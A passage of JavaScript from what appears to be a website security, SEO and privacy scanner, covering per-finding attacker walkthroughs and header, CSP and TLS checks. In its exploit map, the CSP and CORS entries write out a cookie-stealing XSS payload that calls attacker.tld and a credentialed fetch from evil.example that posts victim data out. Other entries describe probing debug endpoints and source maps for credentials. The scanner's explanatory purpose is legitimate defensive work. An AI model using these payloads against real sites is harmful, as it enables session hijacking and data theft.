    'The call to action is cut off.',
    'Weaker click-through than a correctly sized description.',
  ],
  'seo-canonical': [
    'N/A to an attacker — duplicate-content dilution.',
    'List the URLs serving the same content.',
    'No canonical points at the preferred one.',
    'Ranking is split across duplicates.',
  ],
  'seo-viewport': [
    'N/A to an attacker — mobile rendering breaks.',
    'Open the page on a phone.',
    'Text is tiny and the layout does not scale.',
    'Mobile usability failure and a mobile-first ranking penalty.',
  ],
  'seo-lang': [
    'N/A to an attacker — language signals are lost.',
    'Inspect the <html> element.',
    'No lang attribute is set.',
    'Wrong-locale indexing and an accessibility failure.',
  ],
  'seo-h1': [
    'N/A to an attacker — topical relevance weakens.',
    'List the page headings.',
    'No <h1> is present.',
    'No primary keyword signal for the page.',
  ],
  'seo-h1-multi': [
    'N/A to an attacker — topical focus is diluted.',
    'List the page headings.',
    'Multiple <h1> elements are present.',
    'Keyword intent is split and the topic is unclear.',
  ],
  'seo-og': [
    'N/A to an attacker — social previews degrade.',
    'Share the link in a chat or on social.',
    'It renders as a bare URL.',
    'Lower social click-through and unbranded previews.',
  ],
  'seo-jsonld': [
    'N/A to an attacker — rich results are unavailable.',
    'Validate the page against the Rich Results Test.',
    'No structured data is found.',
    'Fewer SERP features and lower visibility.',
  ],
  'seo-status': [
    'N/A to an attacker — a crawl/indexing problem.',
    'Request the canonical URL.',
    'It does not return HTTP 200.',
    'The page is dropped from the index.',
  ],
  'seo-structured-data': [
    'N/A to an attacker — rich-result eligibility is lost.',
    'Run the page through a structured-data validator.',
    'No JSON-LD is present.',
    'No entity or rich snippets in search.',
  ],
  'seo-structured-data-invalid': [
    'N/A to an attacker — the markup is ignored.',
    'Parse each JSON-LD block.',
    'One or more fail to parse.',
    'Crawlers silently discard the malformed block.',
  ],
  'seo-structured-data-incomplete': [
    'N/A to an attacker — the entity is ineligible.',
    'Validate a declared type against its required properties.',
    'Required properties are missing.',
    'The rich result never appears.',
  ],
  'seo-structured-data-base': [
    'N/A to an attacker — brand-entity signals are weak.',
    'Check for an Organization/WebSite entity.',
    'None is declared.',
    'Reduced knowledge-panel and sitelink eligibility.',
  ],
  'seo-llms-txt': [
    'N/A to an attacker — AI crawler guidance is missing.',
    'Request /llms.txt.',
    'It returns 404.',
    'AI assistants quote your content without the framing you want.',
  ],
  'seo-llms-txt-h1': [
    'N/A to an attacker — llms.txt structure guidance.',
    'Inspect /llms.txt for an H1 heading (# Project Name).',
    'No H1 heading found at the top.',
    'PageSpeed Insights and AI models cannot identify primary project entity.',
  ],
  'seo-llms-txt-links': [
    'N/A to an attacker — Markdown link format guidance.',
    'Inspect /llms.txt for Markdown links [Title](url).',
    'Links are formatted as raw URLs without Markdown link brackets.',
    'Google PageSpeed Insights Agentic Browsing check reports missing links.',
  ],
  'seo-ai-crawler-policy': [
    'N/A to an attacker — an AI-scraping policy gap.',
    'Read robots.txt for AI user-agents (GPTBot, ClaudeBot, Google-Extended).',
    'No AI policy is stated.',
    'Content is ingested with no opt-in/opt-out signal.',
  ],
  'seo-ai-content-scraped': [
    'N/A to an attacker — AI content reuse.',
    'Compare robots.txt against the list of known AI crawlers.',
    'The content is open to all of them.',
    'Content may train models or appear in AI answers with no attribution.',
  ],
  'seo-noindex': [
    'N/A to an attacker — indexing is blocked.',
    'Inspect the meta robots tag.',
    'It contains noindex.',
    'The page will not rank — deliberate or accidental.',
  ],
  'seo-noindex-header': [
    'N/A to an attacker — a header-level indexing block.',
    'Inspect the X-Robots-Tag response header.',
    'It contains noindex.',
    'Search engines drop the URL entirely.',
  ],
  'seo-canonical-cross-domain': [
    'N/A to an attacker — you de-rank your own site.',
    'Read the canonical link.',
    'It points at a different domain.',
    'Your ranking signals are passed away.',
  ],
  'seo-canonical-www-mismatch': [
    'N/A to an attacker — apex vs www canonical routing.',
    'Inspect the canonical link href vs the served host.',
    'One uses www and the other uses apex.',
    'Ensure 301 redirects align with your chosen canonical format.',
  ],
  'seo-hreflang-missing': [
    'N/A to an attacker — locale targeting is lost.',
    'Check for hreflang annotations on a multi-language site.',
    'None are present.',
    'Users get the wrong language in results.',
  ],
  'seo-hreflang-invalid': [
    'N/A to an attacker — the annotations are ignored.',
    'Validate each hreflang value against BCP-47.',
    'Malformed values are present.',
    'All hreflang signals are discarded.',
  ],
  'seo-hreflang-xdefault': [
    'N/A to an attacker — no fallback locale exists.',
    'Inspect the hreflang set.',
    'There is no x-default entry.',
    'Unmatched users get an arbitrary locale.',
  ],
  'seo-social-image': [
    'N/A to an attacker — share previews degrade.',
    'Check the og:image tag.',
    'No dedicated share image is set.',
    'Links share as plain text.',
  ],
  'seo-twitter-card': [
    'N/A to an attacker — X/Twitter previews degrade.',
    'Check the twitter:card metadata.',
    'It is absent.',
    'Posts show a bare link with lower click-through.',
  ],

  /* ---- performance: no attacker, user-experience cost ---- */
  'perf-longtasks': [
    'N/A to an attacker — main-thread responsiveness suffers.',
    'Record a performance trace during load.',
    'Long tasks block the main thread.',
    'Taps/clicks feel delayed; INP degrades.',
  ],
  'perf-transfer': [
    'N/A to an attacker — every user pays the bytes.',
    'Measure transfer size in DevTools.',
    'The page moves more bytes than it needs.',
    'Slow load and higher mobile data usage.',
  ],
  'perf-failed-requests': [
    'N/A to an attacker — assets or fetches break.',
    'Open the network tab and reload.',
    'One or more requests fail.',
    'Missing resources silently degrade features.',
  ],
  'perf-network-errors': [
    'N/A to an attacker — intermittent infrastructure trouble.',
    'Watch the network log across reloads.',
    'Network-level errors appear.',
    'Flaky UX and hidden partial outages.',
  ],
  'page-weight': [
    'N/A to an attacker — a pure performance cost.',
    'Measure total transferred bytes.',
    'The page is heavier than comparable sites.',
    'Slower load and a possible Core Web Vitals penalty.',
  ],
  'render-blocking': [
    'N/A to an attacker — first paint is delayed.',
    'Check for blocking CSS/JS in the head.',
    'Render is blocked until they download.',
    'Higher LCP/INP and measurable conversion loss.',
  ],
  'inline-scripts': [
    'An XSS injection gains a nonce-free execution context.',
    'Count the inline <script> blocks.',
    'A strict CSP is impossible without a nonce or hash.',
    'CSP cannot be hardened, so XSS stays easier to exploit.',
  ],
  'no-compression': [
    'N/A to an attacker — bandwidth waste.',
    'Inspect the Content-Encoding header.',
    'No gzip/brotli is applied.',
    'Larger payloads and slower load.',
  ],
  'no-cache': [
    'N/A to an attacker — repeat loads are slow.',
    'Inspect Cache-Control and ETag.',
    'No caching headers are set.',
    'Every visit re-downloads from the origin.',
  ],
  'img-format': [
    'N/A to an attacker — heavier image payloads.',
    'Check the served image formats.',
    'Images use legacy PNG/JPEG/GIF.',
    'Images are 30-60% larger than WebP/AVIF, hurting LCP.',
  ],
  'http-redirect': [
    'N/A to an attacker — extra round-trips.',
    'Follow the request chain.',
    'Multiple redirects precede the final page.',
    'Added latency and diluted link equity.',
  ],
  'deprecated': [
    'N/A to an attacker — dead or fragile tech.',
    'Grep the source for the deprecated API usage.',
    'It is present and still relied upon.',
    'Feature breakage when the browser removes support.',
  ],
  'dns-dnssec': [
    'Position yourself to spoof DNS (rogue resolver, cache poisoning).',
    'Answer with a forged record for the domain.',
    'There is no DNSSEC signature to reject it.',
    'Users are silently redirected to an attacker host.',
  ],
  'no-security-txt': [
    'N/A to an attacker — a disclosure-coordination gap.',
    'Request /.well-known/security.txt.',
    'It returns 404.',
    'Researchers have no private channel, so issues surface publicly or are sold.',
  ],
  'trackers': [
    'Load the page with a clean profile and the network tab open.',
    'Identify the third-party tracker requests.',
    'They collect behaviour and set identifiers.',
    'A GDPR/ePrivacy breach unless consent and a lawful basis exist.',
  ],
  'no-consent': [
    'Load the page with a clean profile.',
    'Observe trackers firing with no consent banner.',
    'Non-essential storage is set pre-consent.',
    'An ePrivacy Art. 5(3) + GDPR breach, demonstrable with a HAR file.',
  ],
  'consent-present': [
    'No exploit — informational.',
    'Confirm the CMP truly blocks pre-consent by checking the network log.',
    'Verify no tags fire before opt-in.',
    'A cosmetic banner that grants by default would still breach the rules.',
  ],
  'data-residency': [
    'Fingerprint the third-party infrastructure.',
    'Map each sub-processor to its region and transfer basis.',
    'A non-EU transfer may exist without documented safeguards.',
    'A GDPR Chapter V exposure if no SCC/DPA is in place.',
  ],
  'hdr-': [
    'Identify which recommended security header is missing.',
    'Craft the request the missing control would have stopped.',
    'Perform the browser-side attack (framing, MIME sniffing, referrer leak).',
    'Chain it with the other findings to escalate impact.',
  ],
  'hdr-x-content-type-options': [
    'Get a file with a non-HTML type served from your origin (upload, log, txt).',
    'Reference it so the browser sniffs and reinterprets it as HTML/script.',
    'Without nosniff the content executes in your origin.',
    'Stored XSS — cookie/session access for any victim who opens the URL.',
  ],
  'hdr-x-frame-options': [
    'Build an attacker page that embeds your site in a transparent iframe.',
    'Position a decoy button over a real logged-in control.',
    'The victim clicks what they think is a game or reward.',
    'They trigger a real action (transfer, delete, permission grant) unknowingly.',
  ],
  'hdr-referrer-policy': [
    'Find a page that carries a token in the URL (reset, invite, share).',
    'Embed a third-party resource on that page.',
    'The full URL is sent in the Referer header to the external host.',
    'Tokens leak to third parties and into their logs.',
  ],
  'hdr-permissions-policy': [
    'Identify a third-party script or iframe running on the page.',
    'It calls a powerful API (getUserMedia, geolocation).',
    'Without Permissions-Policy nothing restricts it.',
    'A compromised third party uses device permissions as the user.',
  ],
  'hdr-permissions-policy-overgrant': [
    'Read the Permissions-Policy header and find a `feature=*` grant.',
    'Embed a hostile iframe (or a compromised third party does).',
    'The embedder requests camera/mic/geolocation/USB under your origin.',
    'Device permissions are abused because the header allowed every origin.',
  ],
  'policy-': [
    'A regulator or user looks for the required policy link.',
    'It is missing from the site.',
    'Users cannot see how their data is handled.',
    'A GDPR Art. 12-14 transparency breach and DPA complaints.',
  ],
  'policy-privacy-policy': [
    'A user (or regulator) looks for how their data is processed.',
    'No privacy-policy link exists.',
    'The lawful basis, retention and rights are undocumented.',
    'A GDPR Art. 12-14 breach and a DPA complaint.',
  ],
  'policy-cookie-policy': [
    'A user inspects which cookies are set.',
    'No cookie-policy link exists.',
    'Purposes and lifetimes are undocumented.',
    'An ePrivacy / GDPR transparency breach.',
  ],
  'policy-terms': [
    'A user or consumer authority looks for the contractual terms.',
    'No terms-of-service link exists.',
    'There are no agreed ground rules or liability limits.',
    'Consumer-law exposure with no agreed terms to rely on.',
  ],
  'policy-imprint-company-info': [
    'A user tries to identify the site operator.',
    'No imprint / company-information page exists.',
    'The legal entity and contact are undisclosed.',
    'An EU legal-notice (imprint) compliance failure.',
  ],
  'csp-unsafe-inline': [
    'Find any reflected or stored input on the site (search, comment, profile, error page).',
    'Submit `<img src=x onerror="fetch(\'https://attacker.tld/c?\'+document.cookie)">` — unsafe-inline lets it run without a nonce.',
    'The payload reads cookies and localStorage and posts them to your collector.',
    'Replay the stolen session cookie to log in as the victim.',
  ],
  'csp-unsafe-eval': [
    'Locate a sink that evaluates strings: a JSON.parse polyfill, a template engine, or a library that passes data to Function()/eval().',
    'Feed it attacker-controlled text (a query parameter that ends up in that path).',
    'The string executes as JavaScript inside your origin.',
    'Use it to read the DOM, tokens and any API the victim is authenticated against.',
  ],
  'cors-credential-leak': [
    'Register `https://evil.example` and host one page with a fetch call.',
    'Send `fetch("https://target/api/me", {credentials:"include"})` — the browser attaches the victim\'s cookies.',
    'Because the API echoes `Access-Control-Allow-Origin: https://evil.example` with credentials, the response body is readable.',
    'Post the stolen JSON (email, tokens, billing data) to your server.',
  ],
  'sourcemap-exposed': [
    'Read `/` and collect every `/assets/*.js` bundle URL.',
    'Request `bundle.js.map` for each; a 200 means the full original source is public.',
    'Run `npx source-map-explorer` or `jq .sourcesContent` to reconstruct it.',
    'Grep the source for endpoints, feature flags, internal hostnames and hard-coded keys, then attack the hidden endpoints.',
  ],
  'debug-endpoints-exposed': [
    'Probe the usual paths: `/debug`, `/actuator/env`, `/actuator/heapdump`, `/graphql`, `/.well-known/...` extras.',
    'A 200 with structured output confirms the endpoint is live on production.',
    'Read environment properties, config or the schema — often including credentials.',
    'Use privileged operations (shutdown, env mutation, GraphQL mutations) if they are exposed without auth.',
  ],
};

const GENERIC_EXPLOIT = [
  'Confirm the issue with the captured evidence (raw header/body shown below).',
  'Reproduce it manually against the target with the command or request in the finding\'s fix.',
  'Chain it with the other findings in this report — most real compromises need two.',
];

function applyExplain(findings) {
  const keys = Object.keys(EXPLAIN);
  for (const f of findings) {
    const id = String(f.id);
    let ex = EXPLAIN[id];
    if (!ex) {
      // Try stripping one trailing instance suffix (cookie-insecure-sid → cookie-insecure).
      ex = EXPLAIN[id.replace(/-[^-]+$/, '')];
    }
    if (!ex) {
      // Longest prefix match (disclosure-x-powered-by → disclosure). A bare
      // prefix is allowed so dynamic ids that append a space or a header name
      // (policy-cookie policy, hdr-x-frame-options) resolve to their family
      // key (policy-, hdr-) instead of the generic fallback.
      const hit = keys
        .filter((k) => id === k || id.startsWith(k + '-') || id.startsWith(k))
        .sort((a, b) => b.length - a.length)[0];
      if (hit) ex = EXPLAIN[hit];
    }
    ex = ex || GENERIC_EXPLAIN;
    f.whatItIs = ex.whatItIs;
    f.whoCanAct = ex.whoCanAct;
    f.impact = ex.impact;
    f.worstCase = ex.worstCase;

    // Exploit walkthrough: exact attacker steps. Matching mirrors EXPLAIN but
    // uses startsWith so family prefixes like `policy-` also cover ids that
    // append a label with a space (`policy-privacy policy`).
    let steps = EXPLOIT[id];
    if (!steps) steps = EXPLOIT[id.replace(/-[^-]+$/, '')];
    if (!steps) {
      const ehit = Object.keys(EXPLOIT)
        .filter((k) => id === k || id.startsWith(k))
        .sort((a, b) => b.length - a.length)[0];
      if (ehit) steps = EXPLOIT[ehit];
    }
    f.exploitSteps = steps || GENERIC_EXPLOIT;
  }
  return findings;
}

/* ------------------------------------------------------------------ *
 * Tech fingerprinting
 * ------------------------------------------------------------------ */

function stripFormControls(chunk) {
  if (!chunk || typeof chunk !== 'string') return '';
  return chunk
    .replace(/<select\b[^>]*>[\s\S]*?<\/select>/gi, ' ')
    .replace(/<option\b[^>]*>[\s\S]*?<\/option>/gi, ' ')
    .replace(/<option\b[^>]*>/gi, ' ');
}

// Client-side DOM / body signatures (scanned strictly against sanitized body, NOT headers)
const CLIENT_TECH_SIGNATURES = [
  ['WordPress', /wp-content|wp-includes|wp-json|<meta[^>]+name\s*=\s*["']generator["'][^>]+wordpress/i],
  ['Shopify', /cdn\.shopify\.com|shopify\.theme/i],
  ['Wix', /wix\.com|wixstatic/i],
  ['Squarespace', /squarespace\.com|static\.squarespace/i],
  ['Next.js', /__NEXT_DATA__|_next\/static/i],
  ['Nuxt', /__NUXT__|_nuxt\//i],
  ['React', /data-reactroot|react(?:-dom)?[.@]/i],
  ['Vue', /data-v-[0-9a-f]{8}|vue(?:\.runtime)?[.@]/i],
  ['Angular', /ng-version|angular(?:\.min)?\.js/i],
  ['Svelte', /svelte-[0-9a-z]{6}/i],
  ['jQuery', /jquery(?:-[\d.]+)?(?:\.min)?\.js/i],
  ['Bootstrap', /bootstrap(?:\.bundle)?(?:\.min)?\.(?:js|css)/i],
  ['Tailwind', /tailwind(?:\.min)?\.css|class\s*=\s*"[^"]*\b(?:flex|grid|text-(?:xs|sm|lg|xl)|bg-\w+|p[xy]?-\d)/i],
  ['Google Fonts', /<link[^>]+href=["'][^"']*fonts\.googleapis\.com/i],
  ['Google Fonts', /@import\s+(?:url\()?["']?[^"')]*fonts\.googleapis\.com/i],
  ['Google Fonts', /<link[^>]+href=["'][^"']*fonts\.gstatic\.com/i],
];
const TECH_SIGNATURES = CLIENT_TECH_SIGNATURES;

function detectTech(res, body) {
  const cleanBody = stripFormControls(body || '');
  const hits = [];

  // 1. Client assets and DOM patterns (scanned strictly against sanitized body)
  for (const [name, re] of CLIENT_TECH_SIGNATURES) {
    if (re.test(cleanBody)) hits.push(name);
  }

  // 2. Server & infrastructure indicators (scanned strictly from headers and infra markers)
  const headers = (res && res.headers) || {};
  const server = headers.server || '';
  const xPoweredBy = headers['x-powered-by'] || '';

  // Cloudflare
  if (headers['cf-ray'] || headers['cf-cache-status'] || /cloudflare/i.test(server)) {
    hits.push('Cloudflare');
  }

  // Vercel: header indicators or deployment assets/domains (never from generic dropdowns/body text)
  if (headers['x-vercel-id'] || headers['x-vercel-cache'] || /vercel/i.test(server) || /_vercel\/|\.vercel\.app/i.test(cleanBody)) {
    hits.push('Vercel');
  }

  // Netlify: header indicators or deployment markers
  if (headers['x-nf-request-id'] || /netlify/i.test(server) || /\.netlify\.app|data-netlify\s*=\s*["']?true/i.test(cleanBody)) {
    hits.push('Netlify');
  }

  // Next.js: via X-Powered-By if present
  if (/next\.?js/i.test(xPoweredBy)) {
    hits.push('Next.js');
  }

  // Server banner
  if (server) {
    hits.push('Server: ' + server);
  }

  return [...new Set(hits)];
}

/* ------------------------------------------------------------------ *
 * Individual check groups
 * ------------------------------------------------------------------ */

function checkTransport(res, findings, meta) {
  const u = new URL(res.url);
  if (u.protocol === 'https:') {
    if (res.tls && res.tls.authorized === false) {
      findings.push(
        makeFinding({
          id: 'tls-untrusted',
          domain: 'security',
          severity: 'critical',
          title: 'TLS certificate is not trusted',
          detail: `The certificate could not be verified: ${res.tls.authorizationError || 'unknown error'}.`,
          fix: 'Install a valid certificate (Let\'s Encrypt / your CA) and ensure the full chain is served.',
          evidence: res.tls.issuer || null,
        })
      );
    }
    if (res.tls && typeof res.tls.daysToExpiry === 'number' && res.tls.daysToExpiry < 21) {
      findings.push(
        makeFinding({
          id: 'tls-expiring',
          domain: 'security',
          severity: res.tls.daysToExpiry < 7 ? 'high' : 'medium',
          title: `TLS certificate expires in ${res.tls.daysToExpiry} day(s)`,
          detail: `Valid until ${res.tls.validTo}.`,
          fix: 'Renew the certificate and enable automatic renewal (certbot / ACME).',
        })
      );
    }
    if (res.tls && res.tls.protocol && !/TLSv1\.[23]/.test(res.tls.protocol)) {
      findings.push(
        makeFinding({
          id: 'tls-old-protocol',
          domain: 'security',
          severity: 'high',
          title: `Outdated TLS protocol negotiated (${res.tls.protocol})`,
          detail: 'Modern clients expect TLS 1.2 or 1.3.',
          fix: 'Disable TLS 1.0/1.1 on the server and prefer TLS 1.3.',
        })
      );
    }
  } else {
    findings.push(
      makeFinding({
        id: 'no-https',
        domain: 'security',
        severity: 'critical',
        title: 'No HTTPS — site served over plain HTTP',
        detail: 'All traffic, cookies and credentials can be intercepted.',
        fix: 'Install a TLS certificate and force HTTPS.',
      })
    );
  }

  if (res.redirects && res.redirects.length) {
    findings.push(
      makeFinding({
        id: 'http-redirect',
        domain: 'quality',
        severity: 'info',
        title: `${res.redirects.length} redirect(s) before final page`,
        detail: res.redirects.map((r) => `${r.status} ${r.url} → ${r.location}`).join('\n'),
        fix: 'Reduce redirect chains to a single hop to improve load time.',
      })
    );
  }
  meta.finalUrl = res.url;
  meta.tls = res.tls;
  meta.wire = {
    status: res.status,
    ttfbMs: res.ttfb,
    rawBytes: res.rawBytes,
    encoding: res.headers['content-encoding'] || 'none',
    cacheControl: res.headers['cache-control'] || null,
    server: res.headers['server'] || null,
    redirects: res.redirects || [],
  };
}

function extractMetaCsp(html) {
  if (!html) return null;
  const tags = html.match(/<meta\b[^>]*>/gi) || [];
  for (const tag of tags) {
    if (/http-equiv\s*=\s*["']?content-security-policy["']?/i.test(tag)) {
      const m = tag.match(/content\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/i);
      if (m) return (m[1] || m[2] || m[3] || '').trim();
    }
  }
  return null;
}

function checkSecurityHeaders(res, findings, meta) {
  // If the request was intercepted by WAF rate-limiting or challenge block (HTTP 429 or 403 challenge, or 200 challenge page),
  // and origin security headers could not be harvested from peripherals, skip to avoid penalizing edge-stripped headers.
  if (!meta?.headersHarvested && (res.status === 429 || res.status === 403 || meta?.isWafChallenge || isWafChallenge(res, res.body))) {
    return;
  }
  const h = res.headers;
  const metaCsp = extractMetaCsp(res.body);
  const want = [
    ['strict-transport-security', 'high', 'HSTS not set', 'Add `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` and force HTTPS.'],
    ['content-security-policy', 'high', 'No Content-Security-Policy', 'Add a CSP to mitigate XSS and data injection. Start in report-only mode, then enforce.'],
    ['x-content-type-options', 'medium', 'X-Content-Type-Options missing', 'Set `X-Content-Type-Options: nosniff`.'],
    ['x-frame-options', 'medium', 'X-Frame-Options missing (and no CSP frame-ancestors)', 'Set `X-Frame-Options: DENY` or use CSP `frame-ancestors` to stop clickjacking.'],
    ['referrer-policy', 'low', 'Referrer-Policy missing', 'Set `Referrer-Policy: strict-origin-when-cross-origin` (or stricter).'],
    ['permissions-policy', 'low', 'Permissions-Policy missing', 'Limit powerful APIs (camera, mic, geolocation) with a Permissions-Policy header.'],
  ];
  const csp = h['content-security-policy'] || metaCsp || '';
  for (const [name, sev, title, fix] of want) {
    const present = Boolean(h[name]);
    let skip = false;
    if (name === 'content-security-policy' && !present && metaCsp) {
      skip = true;
      findings.push(makeFinding({
        id: 'hdr-csp-meta-only',
        domain: 'security',
        severity: 'low',
        title: 'CSP delivered via <meta> tag instead of HTTP header',
        detail: 'A Content-Security-Policy was found in a <meta http-equiv> tag, which cannot enforce `frame-ancestors`, `sandbox`, or `report-uri` directives.',
        fix: 'Move the Content-Security-Policy from <meta> to an HTTP response header.',
        evidence: metaCsp.slice(0, 600),
      }));
    }
    if (name === 'x-frame-options' && (/frame-ancestors/i.test(h['content-security-policy'] || '') || /frame-ancestors/i.test(h['content-security-policy-report-only'] || ''))) skip = true;
    if (name === 'strict-transport-security' && new URL(res.url).protocol !== 'https:') skip = true;
    if (!present && !skip) {
      // Show the exact response and every header actually sent, so the reader
      // can see the gap for themselves rather than trusting a summary.
      const sentHeaders = Object.keys(h).map((k) => `${k}: ${h[k]}`).join('\n');
      const f = makeFinding({
        id: 'hdr-' + name,
        domain: 'security',
        severity: sev,
        title,
        detail: `Response header \`${name}\` was not present.` + (meta?.headersHarvested ? ' (Evaluated with origin headers harvested via /robots.txt)' : ''),
        fix,
        evidence: `GET ${res.url} → HTTP ${res.status}\n\nHeaders${meta?.headersHarvested ? ' (harvested via /robots.txt)' : ''}:\n${sentHeaders}`.slice(0, 2000),
      });
      f.locations = [{ header: name, scope: 'response', url: res.url }];
      findings.push(f);
    }
  }

  // Weak CSP patterns - decoupled for precision (scoped to script execution)
  if (csp) {
    const scriptDirectiveMatch = csp.match(/(?:^|;)\s*script-src\s+([^;]+)/i) || csp.match(/(?:^|;)\s*default-src\s+([^;]+)/i);
    const scriptPolicy = scriptDirectiveMatch ? scriptDirectiveMatch[1] : '';
    const hasUnsafeEval = /'unsafe-eval'/.test(scriptPolicy);
    const hasUnsafeInline = /'unsafe-inline'/.test(scriptPolicy);

    if (hasUnsafeEval) {
      findings.push(
        makeFinding({
          id: 'csp-unsafe-eval',
          domain: 'security',
          severity: 'high',
          title: "CSP allows 'unsafe-eval'",
          detail: "'unsafe-eval' allows dynamic string execution (eval, Function constructor), creating high-risk DOM XSS vectors.",
          fix: "Remove 'unsafe-eval' from your script-src directive. Refactor code to avoid dynamic code generation.",
          evidence: csp.slice(0, 2000),
        })
      );
    }

    if (hasUnsafeInline) {
      findings.push(
        makeFinding({
          id: 'csp-unsafe-inline',
          domain: 'security',
          severity: 'medium',
          title: "CSP allows 'unsafe-inline'",
          detail: "'unsafe-inline' allows execution of inline scripts and event handlers. Required by standard Next.js / React SSR hydration unless strict nonces are used.",
          fix: "For maximum hardening, consider adopting nonce-based CSP ('nonce-...') for inline scripts and remove 'unsafe-inline'.",
          evidence: csp.slice(0, 2000),
        })
      );
    }
  }

  // Version disclosure
  for (const hdr of ['server', 'x-powered-by', 'x-aspnet-version', 'x-generator']) {
    const v = h[hdr];
    if (v && /\d/.test(v)) {
      findings.push(
        makeFinding({
          id: 'disclosure-' + hdr,
          domain: 'security',
          severity: 'low',
          title: `Version disclosure in \`${hdr}\` header`,
          detail: `Revealed: "${v}" — helps attackers target known CVEs.`,
          fix: `Remove or genericise the ${hdr} header.`,
        })
      );
    }
  }
}

/* ------------------------------------------------------------------ *
 * Modern (2026) header & CSP hardening checks
 * ------------------------------------------------------------------ */

function cspDirective(csp, name) {
  const re = new RegExp('(?:^|;)\\s*' + name + '\\s+([^;]+)', 'i');
  const m = csp.match(re);
  return m ? m[1].trim() : null;
}

function checkModernHeaders(res, findings, meta) {
  if (!meta?.headersHarvested && (res.status === 429 || res.status === 403 || meta?.isWafChallenge || isWafChallenge(res, res.body))) {
    return;
  }
  const h = res.headers;
  const csp = h['content-security-policy'] || '';
  const isHttps = new URL(res.url).protocol === 'https:';
  const firstNew = findings.length;

  // Cross-Origin isolation trio (Spectre / XS-Leak hardening).
  const coop = h['cross-origin-opener-policy'];
  const coep = h['cross-origin-embedder-policy'];
  const corp = h['cross-origin-resource-policy'];
  meta.crossOrigin = { coop: coop || null, coep: coep || null, corp: corp || null };
  if (isHttps && !coop) {
    findings.push(makeFinding({
      id: 'hdr-cross-origin-opener-policy', domain: 'security', severity: 'low',
      title: 'Cross-Origin-Opener-Policy missing',
      detail: 'Without COOP, cross-origin windows retain a reference to your page (XS-Leak / Spectre class).',
      fix: 'Set `Cross-Origin-Opener-Policy: same-origin`.',
    }));
  }
  if (isHttps && !corp) {
    findings.push(makeFinding({
      id: 'hdr-cross-origin-resource-policy', domain: 'security', severity: 'info',
      title: 'Cross-Origin-Resource-Policy missing',
      detail: 'Any site may embed your resources. Set CORP to limit who can load them.',
      fix: 'Set `Cross-Origin-Resource-Policy: same-origin` (or `same-site`).',
    }));
  }
  if (isHttps && !coep) {
    findings.push(makeFinding({
      id: 'hdr-cross-origin-embedder-policy', domain: 'security', severity: 'info',
      title: 'Cross-Origin-Embedder-Policy missing',
      detail: 'COEP enables cross-origin isolation (needed for powerful APIs like SharedArrayBuffer).',
      fix: 'Set `Cross-Origin-Embedder-Policy: require-corp` if you need cross-origin isolation.',
    }));
  }

  // Trusted Types — advanced mitigation for DOM XSS (enterprise/banking).
  if (csp && !/trusted-types/i.test(csp)) {
    findings.push(makeFinding({
      id: 'csp-no-trusted-types', domain: 'security', severity: 'info',
      title: 'CSP has no Trusted Types directive',
      detail: 'Trusted Types block DOM-based XSS at the sink even when scripts are injected. Recommended primarily for high-security enterprise or financial applications.',
      fix: 'Add `require-trusted-types-for \'script\'; trusted-types default` (roll out in report-only first).',
      evidence: `Content-Security-Policy: ${csp}`,
    }));
  }

  // CSP baseline directives that are commonly forgotten.
  if (csp) {
    const reportOnlyCsp = h['content-security-policy-report-only'] || '';
    const anyCsp = [csp, reportOnlyCsp].filter(Boolean).join('; ');
    const has = {};
    for (const d of ['default-src', 'object-src', 'base-uri', 'frame-ancestors', 'upgrade-insecure-requests', 'report-to']) {
      has[d] = cspDirective(csp, d) || cspDirective(anyCsp, d);
    }
    if (has['object-src'] === null) {
      findings.push(makeFinding({
        id: 'csp-no-object-src', domain: 'security', severity: 'medium',
        title: 'CSP missing `object-src`',
        detail: 'Legacy plugin content (<object>/<embed>) can be abused for XSS if not restricted.',
        fix: 'Add `object-src \'none\'`.',
        evidence: `Content-Security-Policy: ${csp}`,
      }));
    }
    if (has['base-uri'] === null) {
      findings.push(makeFinding({
        id: 'csp-no-base-uri', domain: 'security', severity: 'low',
        title: 'CSP missing `base-uri`',
        detail: 'An injected <base> tag can hijack all relative URLs on the page.',
        fix: 'Add `base-uri \'self\'` (or `\'none\'`).',
        evidence: `Content-Security-Policy: ${csp}`,
      }));
    }
    if (has['frame-ancestors'] === null && !h['x-frame-options']) {
      findings.push(makeFinding({
        id: 'csp-no-frame-ancestors', domain: 'security', severity: 'medium',
        title: 'CSP missing `frame-ancestors` (and no X-Frame-Options)',
        detail: 'The page can be framed by any origin — clickjacking risk.',
        fix: 'Add `frame-ancestors \'none\'` (or `\'self\'`).',
        evidence: `Content-Security-Policy: ${csp}`,
      }));
    }
    // Only recommend upgrade-insecure-requests if the CSP or HTML actually references plain http:// subresources.
    if (isHttps && has['upgrade-insecure-requests'] === null && /http:\/\//i.test(csp)) {
      findings.push(makeFinding({
        id: 'csp-no-upgrade-insecure', domain: 'security', severity: 'info',
        title: 'CSP missing `upgrade-insecure-requests`',
        detail: 'Sub-resources requested over http:// will not be auto-upgraded.',
        fix: 'Add `upgrade-insecure-requests`.',
        evidence: `Content-Security-Policy: ${csp}`,
      }));
    }
    // Insecure sources in a CSP.
    const httpSrc = csp.match(/https?:\/\/[^\s;]+/g) || [];
    const plainHttp = httpSrc.filter((s) => /^http:\/\//i.test(s));
    if (plainHttp.length) {
      findings.push(makeFinding({
        id: 'csp-http-source', domain: 'security', severity: 'medium',
        title: 'CSP whitelists plain-http sources',
        detail: `Insecure origins are allowed: ${plainHttp.slice(0, 5).join(', ')}.`,
        fix: 'Replace http:// sources with https:// (or drop them).',
        evidence: plainHttp.join('\n'),
      }));
    }
    if (!has['default-src']) {
      findings.push(makeFinding({
        id: 'csp-no-default-src', domain: 'security', severity: 'medium',
        title: 'CSP missing `default-src`',
        detail: 'There is no fallback for resource types you did not list explicitly.',
        fix: 'Add a locked-down `default-src \'self\'` as the baseline.',
        evidence: `Content-Security-Policy: ${csp}`,
      }));
    }
  }

  // HSTS quality (present but weak).
  const hsts = h['strict-transport-security'];
  if (isHttps && hsts) {
    const maxAge = (hsts.match(/max-age=(\d+)/i) || [])[1];
    const age = maxAge ? parseInt(maxAge, 10) : 0;
    if (age < 15552000) {
      findings.push(makeFinding({
        id: 'hsts-weak-maxage', domain: 'security', severity: 'low',
        title: `HSTS max-age is short (${age}s)`,
        detail: 'A short max-age (< 180 days) leaves a window for downgrade attacks.',
        fix: 'Use `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`.',
        evidence: hsts,
      }));
    } else if (!/includeSubDomains/i.test(hsts) || !/preload/i.test(hsts)) {
      findings.push(makeFinding({
